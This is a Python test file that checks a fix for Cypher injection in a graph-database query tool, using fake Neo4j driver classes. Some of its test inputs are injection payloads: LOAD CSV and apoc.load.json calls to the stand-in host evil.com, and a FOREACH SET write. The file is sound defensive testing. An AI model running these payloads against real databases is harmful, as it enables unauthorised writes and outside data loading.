"""
PoC test for CWE-943: Cypher injection via execute_cypher_query tool.

Demonstrates that the keyword blocklist in both system.py and query_handlers.py
can be bypassed, allowing write operations to be submitted through a tool
intended to be read-only.

The fix uses read-only session mode (default_access_mode=READ_ACCESS) to
enforce read-only at the database protocol level, making blocklist bypass
irrelevant.
"""
import re
from typing import Any, Dict, Optional


# ---- Fake Neo4j infrastructure to simulate the driver ------------------

class _FakeResult:
    """Simulates a Neo4j result set."""
    def __init__(self):
        self._records = []

    def data(self):
        return {}

    def __iter__(self):
        return iter(self._records)


class _FakeSession:
    """Simulates a Neo4j session, recording calls."""
    def __init__(self, recorder, access_mode=None):
        self._recorder = recorder
        self._access_mode = access_mode

    def run(self, query, **kwargs):
        self._recorder["last_query"] = query
        self._recorder["last_params"] = kwargs
        self._recorder["access_mode"] = self._access_mode
        return _FakeResult()

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc, tb):
        return False


class _FakeDriver:
    """Simulates the Neo4jDriverWrapper."""
    def __init__(self, recorder):
        self._recorder = recorder

    def session(self, **kwargs):
        access_mode = kwargs.get("default_access_mode")
        self._recorder["session_kwargs"] = kwargs
        return _FakeSession(self._recorder, access_mode=access_mode)


class _FakeDBManager:
    """Simulates DatabaseManager."""
    def __init__(self, recorder):
        self._recorder = recorder

    def get_driver(self):
        return _FakeDriver(self._recorder)


# ---- Tests against query_handlers.execute_cypher_query -----------------

def _run_handler(cypher_query, recorder):
    from codegraphcontext.tools.handlers.query_handlers import execute_cypher_query
    recorder.clear()
    return execute_cypher_query(_FakeDBManager(recorder), cypher_query=cypher_query)


def test_handler_blocks_load_csv():
    recorder = {}
    result = _run_handler(
        'LOAD CSV FROM "http://evil.com/data.csv" AS row RETURN row',
        recorder,
    )
    assert "error" in result, (
        "LOAD CSV passed through the blocklist!"
    )


def test_handler_blocks_foreach_set():
    recorder = {}
    result = _run_handler(
        'MATCH (n) FOREACH (x IN [1] | SET n.pwned = true)',
        recorder,
    )
    assert "error" in result


def test_handler_uses_read_only_session():
    recorder = {}
    result = _run_handler("MATCH (n) RETURN n LIMIT 1", recorder)
    assert recorder.get("session_kwargs", {}).get("default_access_mode") == "READ", (
        "Session not opened in read-only mode — write queries can still execute!"
    )


# ---- Tests against system.SystemTools.execute_cypher_query_tool --------

def _run_system(cypher_query, recorder):
    from codegraphcontext.tools.system import SystemTools
    recorder.clear()
    tools = SystemTools.__new__(SystemTools)
    tools.db_manager = _FakeDBManager(recorder)
    return tools.execute_cypher_query_tool(cypher_query)


def test_system_blocks_call_apoc():
    recorder = {}
    result = _run_system(
        'CALL apoc.load.json("http://evil.com/payload")',
        recorder,
    )
    assert "error" in result, (
        "CALL apoc bypassed the system.py blocklist due to case mismatch!"
    )


def test_system_blocks_load_csv():
    recorder = {}
    result = _run_system(
        'LOAD CSV FROM "http://evil.com/data.csv" AS row RETURN row',
        recorder,
    )
    assert "error" in result, (
        "LOAD CSV passed through the system.py blocklist!"
    )


def test_system_uses_read_only_session():
    recorder = {}
    result = _run_system("MATCH (n) RETURN n LIMIT 1", recorder)
    assert recorder.get("session_kwargs", {}).get("default_access_mode") == "READ", (
        "system.py session not opened in read-only mode!"
    )


def test_system_no_false_positive_on_asset():
    recorder = {}
    result = _run_system("MATCH (n:Asset) RETURN n", recorder)
    assert "error" not in result, (
        "False positive: 'Asset' incorrectly blocked by SET check"
    )


if __name__ == "__main__":
    import sys
    tests = [
        test_handler_blocks_load_csv,
        test_handler_blocks_foreach_set,
        test_handler_uses_read_only_session,
        test_system_blocks_call_apoc,
        test_system_blocks_load_csv,
        test_system_uses_read_only_session,
        test_system_no_false_positive_on_asset,
    ]
    failures = []
    for t in tests:
        try:
            t()
            print(f"  PASS: {t.__name__}")
        except AssertionError as e:
            print(f"  FAIL: {t.__name__}: {e}")
            failures.append(t.__name__)
        except Exception as e:
            print(f"  ERROR: {t.__name__}: {e}")
            failures.append(t.__name__)
    if failures:
        print(f"\n{len(failures)} test(s) failed: {failures}")
        sys.exit(1)
    else:
        print(f"\nAll {len(tests)} tests passed.")
        sys.exit(0)
